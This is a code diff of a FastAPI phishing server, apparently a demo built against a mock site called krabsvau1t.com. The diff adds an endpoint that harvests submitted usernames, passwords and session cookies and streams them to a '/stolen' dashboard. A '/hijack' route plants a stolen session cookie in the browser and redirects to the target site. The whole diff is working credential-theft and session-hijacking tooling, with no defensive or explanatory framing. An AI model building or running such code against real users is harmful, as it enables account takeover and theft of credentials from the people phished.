@@ -1,21 +1,24 @@
 import asyncio
 from pathlib import Path
-from typing import Annotated
 
 import uvicorn
-from fastapi import FastAPI, Form, Request
+from fastapi import FastAPI, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from starlette.responses import RedirectResponse, Response, StreamingResponse
 
-from phishing.credentials import capture_credential, captured_credentials
+from phishing.credentials import (
+    capture_credential,
+    capture_session,
+    captured_credentials,
+)
 from phishing.event_bus import event_bus
 
 ASSETS_DIR: Path = Path(__file__).parents[1] / "assets"
 
 app = FastAPI()
-app.mount("/static", StaticFiles(directory=ASSETS_DIR / "static"), name="static")
-templates = Jinja2Templates(directory=ASSETS_DIR / "templates")
+app.mount("/stolen/static", StaticFiles(directory=ASSETS_DIR / "static"), name="static")
+templates = Jinja2Templates(directory="templates")
 
 
 @app.get("/")
@@ -25,23 +28,46 @@ async def index() -> RedirectResponse:
 
 @app.get("/stolen", response_model=None)
 async def stolen_page(request: Request) -> Response:
-    credentials = [
-        {
-            "username": c.username,
-            "password": c.password,
-            "nCaptures": c.n_captures,
-            "lastCapturedAt": c.last_captured_at.isoformat(),
-        }
-        for c in captured_credentials
-    ]
-    return templates.TemplateResponse(
-        request,
-        "stolen.html",
-        {"credentials": credentials},
+    return templates.TemplateResponse(request, "stolen.html", {})
+
+
+@app.get("/stolen/api/credentials")
+async def list_credentials() -> list[dict[str, str | int | None]]:
+    return [c.to_payload() for c in captured_credentials]
+
+
+@app.api_route("/capture", methods=["GET", "POST"])
+async def capture(request: Request) -> Response:
+    if request.method == "POST":
+        form_data = await request.form()
+        username = form_data.get("username")
+        password = form_data.get("password")
+        if isinstance(username, str) and isinstance(password, str):
+            credential = capture_credential(username, password)
+            event_bus.broadcast_credential(credential)
+    elif request.method == "GET":
+        session_cookie = request.cookies.get("session")
+        if session_cookie:
+            credential = capture_session(session_cookie)
+            if credential:
+                event_bus.broadcast_credential(credential)
+    return Response(status_code=200)
+
+
+@app.get("/hijack")
+async def hijack(cookie: str) -> RedirectResponse:
+    response = RedirectResponse("https://krabsvau1t.com/")
+    response.set_cookie(
+        key="session",
+        value=cookie,
+        secure=True,
+        httponly=True,
+        samesite="lax",
     )
+    return response
 
 
-@app.get("/api/events")
+@app.get("/stolen/api/events")
 async def sse_events() -> StreamingResponse:
     queue = event_bus.add_client()
 
